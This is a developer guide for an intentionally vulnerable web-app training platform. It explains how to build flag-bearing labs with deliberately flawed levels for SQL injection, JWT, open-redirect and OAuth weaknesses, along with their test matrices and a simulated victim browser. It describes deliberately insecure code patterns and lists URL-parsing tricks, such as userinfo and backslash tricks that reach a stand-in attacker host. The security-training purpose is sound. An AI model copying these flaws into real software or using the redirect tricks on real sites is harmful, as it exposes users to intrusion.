# HVWA challenge recipes

How to add a challenge. The worked example is **GK-01 SQLi Login Bypass**
(`src/districts/gatekeeper/gk-01-sqli-login/`): copy its shape, not just its idea.

A challenge is one flag-bearing task, playable at up to four levels. The engine
(`src/core/*`) mounts it, serves its source and diff, issues and checks flags,
and draws the lab bar. The challenge supplies metadata, level code, views and tests.

## 1. Folder pattern

The folder is `<id lowercased>-<slug>` (GK-01 + `sqli-login` = `gk-01-sqli-login`).

```
src/districts/<district>/<id lowercased>-<slug>/
  challenge.ts        metadata + mount(): routes that dispatch to the level module
  model.ts            schema, seed, row types, the level-module interface,
                      lab state (perLevel / perSession) and test seams
  levels/acolyte.ts   one file per implemented level; ONLY these are served
  levels/templar.ts   (View Source shows them verbatim, Diff compares the
  levels/inquisitor.ts lowest exploitable level with divine.ts)
  levels/divine.ts    the secure reference
  views/*.ejs         rendered only through sendPage()
  fixtures/           optional: deliberately binary/malformed lab files
  <id>.spec.ts        the exploit matrix + challenge-specific tests
src/districts/<district>/_shared/   optional: plumbing several labs of the district share
                                    (e.g. gatekeeper/_shared/lab.ts: Result, welcome(), accounts)
src/districts/<district>/index.ts   imports each challenge.ts (registration side effect)
src/districts/index.ts              imports each district index
```

- Level files import types from `../model.js`, never from `../challenge.js`.
- Everything the vulnerability needs lives in the level file, so View Source
  and the Diff tell the whole story. `challenge.ts` and `model.ts` are plumbing.
  **One deliberate exception: error verbosity.** `tryDb` in `challenge.ts`
  decides it (the real message below Divine, a generic one at Divine), so say so
  in `divine.ts`'s comment, where Diff readers will see it.
- Shared plumbing goes in `_shared/`; the flaw itself (limiter, lockout, token generator) never does:
  it stays in the level files so View Source and the Diff show it.
- **District shells, per lab shape.** Labs of one shape (login, JWT, ...) share a shell in
  `_shared/<shape>-lab.ts`: the routes, cookie, vault and other plumbing, driven by callbacks
  (`issue`, `verify`, `blurb`, `links`). Shared views live in `_shared/views/`. A shell never holds policy:
  every verification rule, filter or limiter stays in the lab's own `levels/*.ts`, and lab-specific routes
  (a published key, a wordlist) stay in its `challenge.ts`. Worked example: `gatekeeper/_shared/jwt-lab.ts`
  (`mountJwtPortal`) used by GK-04 to GK-07. Keep the lab seams uniform across the shape
  (e.g. `issueToken(req, claims)`, `mintToken(sessionId, level, claims)`).
- **Test kits.** Tests every lab of a shape repeats live once in `_shared/<shape>-lab.testkit.ts` (suffix
  `.testkit.ts`, never `.spec.ts`: a spec would be collected on its own and registered once per importer).
  Vitest collects only `*.spec.ts`; `tsconfig.json` excludes `src/**/*.testkit.ts`, so test code never reaches
  `dist/`, while `tsconfig.test.json` still type-checks it (`tests/tooling.spec.ts` asserts all three). A lab's
  spec calls the kit's `describe...` function. Worked example: `gatekeeper/_shared/jwt-lab.testkit.ts`
  (`describeJwtLabBasics`).
- **Shared pieces of the pilgrim labs** (sign in as `pilgrim`, take over the admin's data or page: GK-12 ... GK-18),
  all in `gatekeeper/_shared/`:
  - `pilgrimLogin(req)` + the `views/pilgrim-form.ejs` partial: the sign-in check, form and message.
  - `curlFor(req, res, { path, method?, headers?, cookies?, data?, form? })` + `views/curl-note.ejs`: a curl line that
    can work. It carries the full quoted URL, `-X <method>` (PUT, PATCH ...), the headers it needs, `-d '<json>'` and/or
    `--data-urlencode 'name=value'` (values are shell-quoted), and `-b "hvwa_sid=<copy from devtools>"`. Never print the
    sid: a lab belongs to the browser session, so curl without that cookie plays in another session whose flags
    `/api/submit` from the browser would reject. The partial also says the line is bash syntax and that Windows
    PowerShell needs `curl.exe` (plain `curl` there is `Invoke-WebRequest`).
  - `sendAdminPage(res, { admin, granted, denial, flag?, pre?, denyStatus? })` + `views/admin.ejs`: the admin page.
    **A denial is 403 by default**; pass `denyStatus` only with a reason. (GK-17 passes `denyStatus: 200`: that is a
    Batch A exception from before the default existed. Do not copy it.) Pass `flag: { req, challenge }` and the page
    appends the flag line itself, only when `admin` is true, and Divine's rule is built in: "Welcome back." instead of
    a flag, whatever the lab passes. `flagLine(req, challenge)` is the same line for a lab that builds its own page.
    The lab's real access check still lives in `levels/*.ts`.
  - The test kit `pilgrim-lab.testkit.ts`: `describePilgrimLab`, `newCtx`, `pilgrimClient`, `describeCurlExample`,
    `describeCurlPartial`.
  Views include the partials with `<%- include('../../_shared/views/curl-note', { curl: curl }) %>`.
- `fixtures/`: any path segment named `fixtures` is exempt from the repo
  hygiene scan (UTF-8, no control characters). Non-`.ts` files there are copied
  into `dist/` by `copy-assets`.

## 2. The four levels

| Level | Means | Example (GK-01) |
|---|---|---|
| **Acolyte** | No defense | both fields concatenated into SQL |
| **Templar** | Naive filter / blacklist | quotes stripped from the username only |
| **Inquisitor** | Real defense, subtly flawed | parameterized, but the password is compared with `LIKE` |
| **Divine** | Correct for the weakness under study; other gaps noted in a comment | parameterized, exact comparison, generic errors; the comment notes that hashing and rate limiting are out of scope; never issues a flag |

Each exploitable level needs its own exploit, and each level is a step up: the
exploit for a level must fail at the next implemented level above it (matrix
case (g)). Divine resists every exploit.

## 3. Engine helpers

| Helper | From | Use |
|---|---|---|
| `defineChallenge(input)` | `core/registry` | validate metadata, default `points` (100) and `check` (level-bound flag) |
| `register(c)` | `core/registry` | add to the registry (rejects duplicate id or route), deep-freeze |
| `challengeDir(import.meta.url)` | `core/source` | the `dir` field: the folder holding `levels/` |
| `byLevel<M>({ acolyte, templar, inquisitor, divine })` | `core/lab` | gather the level modules against one interface `M`; `.levels` (rank order) goes to `defineChallenge`, `.for(req.level)` picks the module. Omit levels you do not implement |
| `perLevel(factory)` | `core/lab` | one lazily created instance per level, shared by all players: `.for(level)` |
| `perSession(factory, { maxEntries?, idleTtlMs? })` | `core/lab` | one lazily created instance per (session, level) via `factory(level, sessionId)`: `.for(req)` |
| `perSession(...).reset(req)` | `core/lab` | drop that (session, level)'s instance (calls `dispose`): the body of a lab's `reset` hook |
| `labPath(res)` | `core/lab` | the canonical lab path `/d/<district>/<slug>`, set by the engine as `res.locals.labPath` (also readable in views as `labPath`); use it for every lab link and cookie path |
| `header(req, name)` | `core/lab` | a request header as a string (`undefined` if missing or repeated); client-written, never an identity |
| `fixtureLines(url)` / `sendLines(res, lines)` | `core/lab` | a lab's fixture list read once (`new URL('./fixtures/x.txt', import.meta.url)`) and served from a lab route as `text/plain` |
| `challengeDb(schema, seed?)` | `core/challenge-db` | private in-memory SQLite, `prepare()`-only facade |
| `tryDb(req, () => call(), label?)` | `core/lab` | `{ ok: true, value }` or `{ ok: false, message }`: `<label>: <msg>` below Divine (label defaults to `Database error`), `Invalid request.` at Divine. Synchronous only: a Promise result throws |
| `field(req, name)` | `core/lab` | a body field as a string, `''` for missing or non-string values |
| `flagFor(req, challenge)` | `core/mount` | this session's flag at the served level; throws at Divine |
| `sendPage(res, viewFile, data)` | `core/render` | the only way to render (absolute `.ejs` path) |
| `simWorld({ mailboxes })`, `world.browser(handler)` | `core/sim` | victim-driven labs: one player's inbox, attacker log and the victim's browser, made inside the lab's `perSession` factory (section 8) |
| `defineChallenge({ victim: { sim, actions } })`, `VICTIM_LABELS` | `core/registry`, `core/sim` | the victim's buttons (`POST <lab>/victim/<name>`, 303 back) and the inbox / attacker-log panel under every lab page (section 8) |
| `classifySimUrl(url, base?)`, `labHref(u, base, level)` | `core/sim` | where a URL really takes the victim's browser (`citadel` / `attacker` / `other`); a citadel URL as a link into the lab (section 8) |
| `sendSimRedirect(res, location, status?)` | `core/sim` | a real route answering a level's redirect: a citadel URL goes to the same place in the lab, anything else gets a "your browser would go to ..." page, never a real redirect off the lab (section 8) |

`req.level` on a challenge route is already clamped to the implemented levels;
`req.sessionId` and `req.lang` are typed. `res.locals.challenge` and
`res.locals.level` feed the layout's lab bar.

### GK-01, condensed

```ts
// model.ts
export interface LoginLevel {
  findUser(db: ChallengeDb, username: string, password: string): UserRow | undefined;
}
const users = perLevel(() => {
  const adminPassword = randomBytes(16).toString('hex');
  const db = challengeDb(SCHEMA, (raw) => { /* seed citadel_admin + pilgrim */ });
  return { db, adminPassword };
});
export const usersDb = (level: Level) => users.for(level).db;
export const adminPassword = (level: Level) => users.for(level).adminPassword; // test seam

// challenge.ts
const impl = byLevel<LoginLevel>({ acolyte, templar, inquisitor, divine });
export const GK01 = register(defineChallenge({
  id: 'GK-01', district: 'gatekeeper', slug: 'sqli-login', dir: challengeDir(import.meta.url),
  levels: impl.levels, /* title, summary, maps, hints */
  mount: (router) => {
    router.get('/', (_req, res) => sendPage(res, view, { account: PLAYER, result: null, username: '', password: '' }));
    router.post('/', async (req, res) => {
      const username = field(req, 'username');
      const password = field(req, 'password');
      const db = usersDb(req.level);
      const level = impl.for(req.level);
      const found = tryDb(req, () => level.findUser(db, username, password)); // DB call only
      // ... flagFor(req, GK01) only for an admin row below Divine, OUTSIDE tryDb
      await sendPage(res, view, { account: PLAYER, result, username, password });
    });
  },
}));
```

For a shape with a shell, a lab's `challenge.ts` shrinks to metadata, the shell call
(`mountJwtPortal(router, { challenge, blurb, issue, verify, ... })`) and its own routes; see section 1.

## 4. Platform rules

**(a) Render only with `page()` / `sendPage()`** from `core/render.ts`, never
`res.render()` or a two-argument `ejs.renderFile` with request data (EJS option
injection would reach the host process). View data may not use the reserved
keys: `escapeFn include rethrow __append __output locals body t lang challenge level labBar labPath simPanel`.

**(b) The vulnerability lives only in the challenge's own surface**: its level
files, its `challengeDb`, its simulated sandbox. Never in shared platform code.
The platform and Divine stay secure.

**(c) A custom `check()`** follows the contract in `registry.ts`: true only for
the level the submission proves, side-effect free, no platform DB.

**(d) Read the level from `req.level`.** Divine never issues a flag (`flagFor`
throws there). Call `flagFor` outside `tryDb`, so an engine error reaches the
stack-free error handler instead of being shown as a "database error".

**(e) Attacker input reaches a challenge DB only through `challengeDb`'s
`prepare()`**, never a raw `exec()`. The seed callback may use the raw handle.

**(f) Labs whose exploit mutates state** (lockout counters, OTPs, balances,
roles, coupons, stored XSS, memory poisoning...) keep that state in
`perSession()`, so one player's exploit never changes another player's lab.

**(g) Never rely on genuinely slow SQL.** `node:sqlite` is synchronous with no
query timeout: a heavy injected query blocks the whole server. Time-based labs
evaluate the injected condition, then `await` a simulated delay. Labs that run
fully attacker-chosen SQL must also cap result size.

**Lab state: `perLevel` or `perSession`.** Never a bare module-level
`challengeDb` for a lab that holds a secret or state.

- `perLevel(factory)`: read-only labs whose data the exploit only reads, but
  where a secret (password, token, signing key, coupon code) must not cross
  levels. One instance per level, shared by every player. In GK-01 an admin
  password dumped by Acolyte SQLi earns the Acolyte flag (a legitimate attack
  path) but logs in nowhere else.
- `perSession(factory, { maxEntries, idleTtlMs })`: anything an exploit (or
  normal play) mutates. One instance per (session, level), so it already
  isolates levels: do not wrap it in `perLevel`. Memory is bounded: least
  recently used instances beyond `maxEntries` (default 5000) are evicted, and
  instances idle longer than `idleTtlMs` (default 26 h) are dropped. A dropped
  lab is rebuilt fresh on the next request, so labs must tolerate a reset.
  An optional `dispose(value)` runs when an instance is evicted or expires (to
  release a resource; its errors are swallowed). The bound is per `perSession`
  holder, so the worst case is `maxEntries` x the number of stateful labs: fine
  for a loopback single-player lab. A holder that keeps simulated-victim state is capped lower (section 8).
  **Eviction and TTL expiry are a reset** (counters, locks and secrets are rebuilt), so a lab with limiters must
  survive neither: (a) `idleTtlMs` must exceed the longest lock or lockout the lab uses (the default 26 h is
  longer than the 24 h cap of the Divine escalating locks; never lower it for such a lab); (b) creating
  instances is rate limited so an eviction flood is impractical: each holder allows `maxNewPerMinute` (default
  120) new instances a minute (`NewSessionLimitError`, HTTP 429, nothing evicted), and the app issues at most 60 new
  `hvwa_sid` a minute (`createApp({ maxNewSessionsPerMinute, sessionClock })`, 429 "Too many new sessions").
  With 5000 entries a flood needs about 42 minutes at the default rate. Holders live at module level, so every app in a spec file shares them and fresh apps do NOT reset the limit. Tests
  therefore run with the per-holder default lifted to `Infinity` (`setPerSessionDefaults` in `src/core/lab.ts`, called
  from `tests/support/setup.ts`); a holder with an explicit `maxNewPerMinute` keeps it, so a limit test must pass it
  (or set the default itself). Any per-session store (an inbox, an attacker log, ...) must go through `perSession` so it
  inherits these limits; never keep your own Map keyed by session id.

**Restart lab (rare).** A lab whose state can get *stuck* (a hijacked or poisoned session, stored-XSS cleanup, a
wedged workflow) may pass `reset: (req) => holder.reset(req)` to `defineChallenge`. The engine then mounts
`POST <lab>/_reset?level=<level>` (calls the hook, answers 303 back to the lab) and the lab bar shows a
"Restart lab" button. Reset only the served level. The route has a per-(session, level) cooldown
(`resetCooldownMs`, default 10 s, answers 429 while cooling; tests inject `createApp({ resetClock })`), a safety net
and not a licence for the rules below.

**Restart must never refill a budget.** It must not refill an attempt budget, clear a lockout or limiter, or
re-roll a guessable secret while clearing counters: "reset, guess 5 times, repeat" would beat every level without
its designed flaw (the session survives a restart, so flags stay earnable). Therefore **labs with limiters,
lockouts, OTP counters or attempt budgets must not define `reset`**: their state must heal on its own (locks expire,
a sign-in issues a new code). Say it in the spec: `POST <lab>/_reset` is 404, and N failures + a reset attempt +
the real secret is still refused with no flag (GK-02, GK-03, GK-15). GK-17 keeps Restart because it touches no limiter.

**Every lab answers `GET /` at every implemented level** with 200, rendered
with `sendPage` (so it has the lab bar); the `labs.spec.ts` smoke test and
`verify:dist` request it. **API-only labs** (the Archive API district) still
serve an HTML landing page at `GET /` describing their endpoints (method, path,
an example request), and mount the API itself on sub-paths.

**Errors.** Wrap only the DB or parser call in `tryDb`. Below Divine the real
message is shown on purpose (error-based learning, CWE-209); Divine shows a
generic message. Parser labs (XXE, YAML) pass a label:
`tryDb(req, () => parse(xml), 'Parser error')`. `fn` must be synchronous
(`node:sqlite` is); `tryDb` throws if it returns a Promise. Read body fields
with `field()`, so a JSON object or extended-urlencoded nesting is an empty
string, not a 500.

**Lab links and cookies.**

- **Links are absolute, built from `labPath`.** Never a relative `href` (`wordlist.txt` on
  `/d/gatekeeper/brute-force` resolves to `/d/gatekeeper/wordlist.txt`), and never `req.baseUrl`: it echoes the
  request's spelling (`/D/GATEKEEPER/...`), which gives wrong links and cookie paths. Pass `base: labPath(res)`
  to the view and include `?level=<level>` where the target is level-specific.
- **Lab cookies:** `Path` = `labPath(res)` (browsers match cookie paths case-sensitively); a distinct name per
  level (levels share the path and must not overwrite each other: `citadel_sid_<level>`); choose `httpOnly`
  deliberately (a session id: yes, and say in the view how to edit it, devtools storage or `curl -b`; a
  deliberately client-writable counter: no); never a name starting with `hvwa_` (the platform's).
- **A request without the lab's cookie must not change lab state.** Probing a page (an admin page, a wrong guess)
  must not mint sessions, advance generators or push activity entries; only the pages the player uses to get a
  session do. Pin entries the lab depends on (the admin's session, the admin's activity line) so trimming a list
  never drops them.
- **Bound every map keyed by attacker input** (header values, usernames, spellings): cap its size, hash long keys
  (`> 64` chars), and track only real accounts where the design allows it. A cap that evicts must not let the
  attacker flush a counter they care about (made-up names must not push the admin's counter out).
- **Fixtures** (wordlists, leaked lists) live in `fixtures/`, are read once with `fixtureLines` and served with
  `sendLines`; the page links them by absolute path.
- **Limiters and lockouts must not be beaten by waiting.** A short window or a short lock turns a brute-force lab
  into "wait and retry" at every level, Divine included. Use long windows or locks (15 min or more) below Divine and
  an escalating per-account lockout at Divine (the fifth failure locks, every further one doubles it, capped), so
  that the designed bypass, not patience, is the practical path. Re-signing-in, resending a code or any other
  convenience flow must not hand the budget back either (add a "re-sign-in" scenario to the spec).
- **Time-dependent behaviour uses an injectable clock** (`state.now`, a test seam on the lab state), never
  `setTimeout`, `sleep` or real minutes: tests move the clock (`state.now = () => t`) and stay fast.

## 5. Views, language and hints

- **Language policy.** Content inside a lab (the vulnerable app's own headings,
  labels, messages) is English by design: it is a realistic target. All player
  guidance is bilingual (ID/EN): `title`, `summary` and `hints` are `Text`
  values; platform strings go in `core/i18n.ts`.
- **The lab bar is automatic.** The layout shows the id, title, summary, served
  level, a level switcher and a link back to `/c/<id>` on every challenge route,
  and defaults `<title>` to `<id> — <title>`. Do not repeat these in the view.
- **Lab views** (see `gk-01-sqli-login/views/login.ejs`): wrap the app in
  `<section class="lab">`; show messages in `<p class="lab-message lab-success|lab-error">`;
  tell the player their own account if the lab has one; use text inputs so
  payloads stay visible; keep submitted values (escaped) after a POST; post back
  to the lab with no `action` attribute.
- **Escape everything** with the escaped output tag. If the vulnerability is in
  rendering (XSS), the level module builds that one fragment (escaping it or
  not) and the view outputs only that fragment raw.
- **Never put an EJS tag inside an EJS comment.** The comment ends at the first
  closing delimiter and the rest breaks parsing. Describe tags in words.
- **Hints**: three tiers (typically cost 10/20/40), bilingual, each more
  specific, none containing a literal payload. Point at the mechanism (where
  input goes, which field is filtered, what a wildcard means). Phrase tier 3 as a
  guiding question ("what besides waiting makes the lock forget?", "who keeps the
  count?"), and make every tier add information the page does not already state.

## 6. Testing: the exploit matrix

Every challenge spec declares its matrix with `describeExploitMatrix` from
`tests/helpers.ts`; it generates named cases, one level each:

```ts
describeExploitMatrix<Creds>({
  challenge: GK01,
  path: '/d/gatekeeper/sqli-login',
  send: (agent, _level, creds, url) => agent.post(url).type('form').send(creds),
  exploits: { acolyte: {...}, templar: {...}, inquisitor: {...} }, // one per non-Divine level
  resisted: 'Invalid credentials.',            // the answer to an exploit at Divine (or a per-exploit-level map)
  legit: [{ name: 'own account', input: { username: 'pilgrim', password: 'pilgrim' }, expect: 'Welcome, pilgrim' }],
  malformed: [{ name: 'lone quote', input: { username: 'pilgrim', password: "'" }, levels: ['acolyte', 'templar'] }], // or []
  privileged: {                                 // or null
    name: 'real admin',
    input: { username: 'citadel_admin', password: adminPassword('divine') },
    expect: /Welcome, citadel_admin/,
  },
  // optional: cumulative: ['inquisitor'],      // see (g); explain why in the spec
  // optional: errorRe: /Parser error/,         // parser labs; default DB_ERROR_RE
});
```

`send` gets a fifth argument `{ sid }`, the case's session id, so stateful labs can
reach per-session test seams (a secret, a counter). One `send` may fire several
requests (a scenario: N failed logins, then the real one) and return the last response.

Required cases (generated):

- **(a)** `exploits` keys equal the challenge's non-Divine levels.
- **(b)** each exploit at its level shows a flag that `/api/submit` credits at exactly that level.
- **(c)** Divine answers every exploit with `resistedStatus` (default 200), the `resisted` text, no flag and no error text.
- **(d)** each `malformed` input shows error text at its listed levels and none at Divine.
- **(e)** each `legit` input works at every level: 200, expected text, no flag.
- **(f)** the `privileged` input (real credentials) works at Divine with no flag.
- **(g)** step-up: the exploit for each level is resisted (no flag) at EVERY
  implemented non-Divine level above it, so a regression two levels up is caught
  too (only "no flag" is required there, not the `resisted` text). On by default.
  `cumulative: [level]` skips that level for exploits from below, when they
  legitimately still work there; it must be explicit and explained in the spec.
  `resisted` may also be a map keyed by the exploit's level, when Divine answers
  different exploits differently (case (c) uses the entry for that exploit).

`resistedStatus` (optional, default 200) is the status Divine answers exploits with in (c): a
number, a non-empty list of accepted numbers, or a map keyed by the exploit's level (levels not
in the map expect 200). Use it for API-style or access-control labs (JWT APIs, IDOR, broken
access control) where a real 401/403/404 teaches more than a polite 200. Values must be integers
100-599, or setup throws. It changes only the status: Divine must still never show a flag or
error text, and the `resisted` text must still match. The other cases ((d)-(f)) keep asserting 200.

"Error text" is `errorRe` (default `DB_ERROR_RE`; pair `/Parser error/` with a
`tryDb` label). `malformed: []` and `privileged: null` are explicit opt-outs
for labs with no such errors or no privileged identity. Add challenge-specific
tests next to the matrix (GK-01: per-level isolation, view escaping, kept
values, non-string fields). `FLAG_RE` and `DB_ERROR_RE` are exported for them.

Test plumbing for stateful labs (all in `tests/helpers.ts`): `send(..., { sid, app })` for per-session test seams;
`bare(app, sid, 'name=value')` for requests that carry only the session cookie plus a cookie the lab did not
give you (the agent's jar always wins over a hand-set Cookie header, so never reach into supertest internals);
`runWarmupThenFinal(scenario, fire)` for "N failures, then the real secret"; and
`describeLabView({ ... })` (probes the first implemented non-Divine level; put every form field except the echoed one in `extra`) for the view basics every lab shares (own account told, no `type="password"`,
forms without `action`, escaped payload, odd bodies not a 500, message classes, upper-case URL uses the canonical
path). Do not write assertions inside an `if` that can pass vacuously: draw new sessions until the condition
holds, then assert unconditionally. Exploit scripts must detect success by "not the denial text", not only by a
flag, because Divine never shows one.

One server per app: `import request from 'supertest'` in a spec is aliased (`vitest.config.ts`) to
`tests/support/supertest.ts`, so `request(app)` / `request.agent(app)` with an Express app listen ONCE per app
(closed when the test ends) and reuse keep-alive sockets. Plain supertest starts a server and a connection per request,
which leaves thousands of sockets in TIME_WAIT and exhausts ephemeral ports (`EADDRINUSE` in unrelated specs). Keep
using `request` / `freshSession` / `bare` as usual; `serve(app)` (from `tests/helpers.ts`) returns the http.Server.
Never deep-import or `require` the real supertest (`tests/tooling.spec.ts` fails if a spec does). Test servers listen on a random port on all interfaces for the length of a test (see `docs/SECURITY.md`): run tests on a trusted network.

**Mutation self-check** before committing (revert by rewriting the file, not
`git checkout` over uncommitted work):

1. Make one exploitable level secure: its exploit case goes red.
2. Make Divine fall for an exploit: its resist case goes red.
3. Make Divine leak an error message: the Divine malformed case goes red.
4. Make Divine show a flag to the privileged user: the privileged case goes red.
5. Copy the level below over a level: its step-up case goes red.

If a mutation stays green, the matrix is missing a case.

## 7. New-challenge checklist

1. Read the catalog row (levels, standard mapping) and this file.
2. Write `<id>.spec.ts` first (matrix + specifics); run `npm test -- <id>` and watch it fail.
3. `model.ts`: schema, seed, row types, the level-module interface, `perLevel` or `perSession` state, test seams.
   A lab where someone else must click (a reset mail, an OAuth link, a session link) adds a simulated victim: section 8.
4. `levels/*.ts`: Acolyte no defense, Templar naive filter, Inquisitor flawed defense, Divine correct
   for the weakness; `divine.ts`'s comment notes generic errors and any gaps left out of scope.
5. `challenge.ts`: `byLevel<M>`, `register(defineChallenge({ ..., dir: challengeDir(import.meta.url), levels: impl.levels }))`,
   bilingual title/summary/3 hints, routes using `field`, `tryDb`, `flagFor`, `sendPage`.
6. `views/*.ejs`: `.lab` markup, escaped output, English lab content (API-only labs: an HTML landing page).
7. Import `challenge.js` from the district `index.ts` (and the district from `src/districts/index.ts`).
8. Mutation self-check (section 6). For a stateful lab also: use `labPath` for links and cookie paths,
   bound attacker-keyed maps, and check that waiting and re-signing-in do not beat the limiter.
9. `npm test`, `npm run typecheck`, `npm run verify:dist` all green; commit `feat(<district>): <ID> <title>`.

## 8. Victim-driven labs (`core/sim.ts`)

Some flaws need someone else to click: the admin opens a reset mail whose link host came from a header (GK-09),
follows an OAuth authorize link while signed in (GK-10, GK-11), signs in through a session link (GK-16). The engine
simulates that victim deterministically and with **no real network**: nothing in `core/sim.ts` opens a socket,
resolves a name or fetches (a guard test in `tests/sim.spec.ts` checks the imports and spies on fetch, http, https,
net and dns during a visit). The worked example is the fixture lab SV-01 in `tests/sim-lab.spec.ts`.

### The two hosts

| Host | What it is | What happens to a request |
|---|---|---|
| `http://citadel.test` (default port only) | the lab itself, as the victim sees it: `http://citadel.test/<path>` is the lab route `<labPath>/<path>` | answered in process by the lab's handler |
| `http://attacker.test`, any `*.attacker.test`, any port | the player's server | appended to the player's attacker log; the visit ends there (nothing is served back) |
| anything else | IPs (any spelling), `localhost`, other hosts, citadel.test on another port or a subdomain of it, `javascript:`/`data:`/`file:` ... | unreachable; nothing is logged |

`classifySimUrl(url, base?)` decides, with the WHATWG URL parser browsers use (no DNS). It returns
`{ site, url, origin, host, path, search, query, userinfo, reason? }`; its comment lists the rules. In short: userinfo never
decides the site (`http://citadel.test@attacker.test/` is attacker.test, and the userinfo is never sent), one trailing
dot is dropped (`ATTACKER.TEST.`), `\` is `/` (`http://attacker.test\@citadel.test/` and `/\attacker.test` reach the
attacker), full-width letters map to ASCII while look-alike letters from other scripts become `xn--` labels (never a sim
host), empty labels are `other`, and URLs over `SIM_LIMITS.urlLength` (2048) before or after serialization are `other`.
`attacker.test.citadel.test` is `other`; `citadel.test.attacker.test` is the attacker. **Labs that teach a URL-parsing
flaw do their own (flawed) check in the level file** (`startsWith('http://citadel.test')`, a substring test, a
hand-written parser); the classifier is the ground truth for where the victim's browser then went.

### What is simulated

- **`simWorld({ mailboxes })`**: one player's world at one level: `world.inbox`, `world.attackerLog`, the victim's recent
  visits (`world.visits`) and a clock (`world.now`, a test seam like `state.now`).
- **`world.inbox`**: fixed mailboxes, `PLAYER_MAILBOX` (`pilgrim@citadel.test`) always plus the ones named (usually
  `ADMIN_MAILBOX`); mail to any other address bounces (`deliver()` returns `undefined`), so no map is keyed by attacker
  input. `deliver({ from, to, subject, body, links })`, `newest(address)`, `list(address)` (newest first). Links are an
  explicit list: "the admin clicks the first link" is `links[0]`.
- **`world.attackerLog`**: append-only, capped (oldest dropped, sequence numbers keep counting): method, URL, `Referer`,
  form body, time.
- **`world.browser(handler)`**: a victim's browser. `follow(url, { referrer? })` opens a link, `submit(url, form)` posts a
  form; both return a `SimVisit` trace (`outcome`: `page` | `attacker` | `unreachable` | `too-many-redirects` | `loop`,
  the `hops`, and the final citadel `page`). Its cookie jar (`browser.cookies`) holds citadel.test cookies only, never
  real ones and never sent to attacker.test; `cookies.set()` signs the victim in up front. Every citadel request calls
  `handler(req: SimRequest): SimResponse` synchronously: `req` has `method`, `url`, `path`, `query`
  (URLSearchParams), lower-case `headers`, `cookies` and form `body` (null prototypes; `field()` and `header()` work on
  it); the response is `{ status, headers?, body? }`, where `Location` (3xx), `Set-Cookie`, `Refresh` and
  `Referrer-Policy` are honoured. At most 10 redirects; the same request again with the jar unchanged is a loop.
- **Referer, as real browsers send it**: a link opened from mail has none; `follow(url, { referrer })` is a click on a
  citadel page. **A 3xx keeps the referrer of the page that started the navigation** (an open redirect does not leak
  its own URL). **A citadel page that moves the browser on by itself sends its own URL**: answer
  `200` with `Refresh: 0; url=<next>` (the stand-in for a meta refresh or a script; the sim does not parse HTML).
  `Referrer-Policy` on that page (or on a redirect) applies; the default is the legacy full URL
  (`no-referrer-when-downgrade`). The Referer never carries userinfo or a fragment, and nothing ever comes FROM attacker.test.
  So an OAuth code leaks through `Referer` only from a page that forwards (GK-10 Inquisitor: the callback page moves on
  to `next=`), and Divine can stop it (`Referrer-Policy: no-referrer`, no secrets in URLs, no open forward).
- **Limits** (`SIM_LIMITS`): URL 2048 chars, 10 redirects, 3 mailboxes (the player's included) of 10 mails (subject 200,
  body 2000, 3 links), 30 log entries, 20 cookies of 4096 bytes, 5 visits (page bodies kept to 2000 chars), notes of
  500 chars. Every clipped field is a copy, so an over-long input is never kept alive behind its clip.

### All victim state goes through `perSession`

`simWorld()`, `simInbox()`, `attackerLog()` and `world.browser()` throw unless called inside a `perSession` factory, so
victim state is always per player and level, bounded, and inherits the new-instance limits. They also cap the holder
whose factory creates them (`capPerSessionHolder` in `core/lab.ts`), because a filled world is about a megabyte:
at most `SIM_LIMITS.worldsPerLab` (250) instances and `SIM_LIMITS.newWorldsPerMinute` (30) new ones a minute, by default
and as a ceiling. A lab may pass lower `maxEntries` / `maxNewPerMinute`, never higher: asking for more fails at the first
factory run. Keep the world and the
victim's browser in the lab's own per-session state, next to whatever else the lab tracks (accounts, tokens, codes),
so one eviction or one `reset` drops all of it together:

```ts
// model.ts
export interface LabState { readonly world: SimWorld; admin: SimBrowser; /* accounts, tokens ... */ now: () => number }
const labs = perSession((level): LabState => {
  const world = simWorld({ mailboxes: [ADMIN_MAILBOX] });
  const state = { world, now: () => world.now() } as LabState;
  state.admin = world.browser((r) => citadel(level, state, r)); // the victim's view of the lab
  state.admin.cookies.set('pid_session', signInAdmin(state));   // already signed in to Pilgrim-ID
  return state;
});
export const labFor = (req: { sessionId: string; level: Level }) => labs.for(req);
```

### How levels plug in

The handler is the lab seen from the victim's browser. It dispatches on `r.path` and calls **the same level functions
the real routes call**, so the flaw lives in `levels/*.ts` once and View Source and the Diff tell the whole story:

```ts
// challenge.ts (or model.ts)
function citadel(level: Level, state: LabState, r: SimRequest): SimResponse {
  const impl = byLevelImpl.for(level);
  if (r.path === '/authorize') return impl.authorize(state, r.query, r.cookies.pid_session, ''); // { status: 302, headers: { Location } }
  if (r.path === '/reset') return { status: 200, body: 'Choose a new password' };
  return { status: 404, body: 'Not found' };
}
```

Real routes serve the player's real browser (Express, `sendPage`); the handler serves the victim (plain objects,
never HTTP). Links the lab builds for mails are sim URLs (`http://citadel.test/reset?token=...`, or whatever host a
flawed level put there); the panel turns citadel links in the player's own mailbox into "open in lab" links
(`labHref`), and shows every other link as text.

**Where the lab lives is a parameter.** One level function answers both browsers, the player's at
`/d/<district>/<slug>/...` and the victim's at `http://citadel.test/...`, so it never hard-codes either: it takes a
`base` and builds every lab-local `Location` (`${base}/idp/login`) and cookie `Path` (`base || '/'`) from it. Real
routes pass `labPath(res)`; the citadel handler passes `''` (use `CITADEL_ORIGIN` where a sim URL must be absolute, e.g.
a link in a mail or a registered `redirect_uri`). A hard-coded `Path=/d/...` never matches in the victim's jar (its
requests are for `/callback`), and a hard-coded `/callback` leaves the lab on a real route.

**A real route never answers a sim URL with `res.redirect`.** URLs that are data (the registered
`http://citadel.test/callback`, a player's `redirect_uri` or `next=`) are sim URLs: the player's own browser cannot reach
citadel.test, and `res.redirect(redirect_uri)` from a lab route would be a REAL open redirect off the loopback lab.
Answer a level's 3xx with `sendSimRedirect(res, location, status?)`: a citadel URL (or a path under `labPath(res)`)
goes to the same place in the lab at the served level (the IdP's `302 http://citadel.test/callback?code=...` becomes
`302 <lab>/callback?code=...&level=<level>`); anything else (attacker.test, another host, `javascript:`) gets a page
that shows the URL as text and says that in this lab the simulated victim's browser goes there. It never links to it.

```ts
router.get('/idp/authorize', async (req, res) => { // the player authorizes in their own browser
  const params = new URLSearchParams(req.originalUrl.split('?')[1] ?? '');
  const out = impl.for(req.level).authorize(labFor(req), params, req.cookies.pid_session, labPath(res));
  const location = out.headers?.Location;
  if (typeof location === 'string') return sendSimRedirect(res, location); // never res.redirect(location)
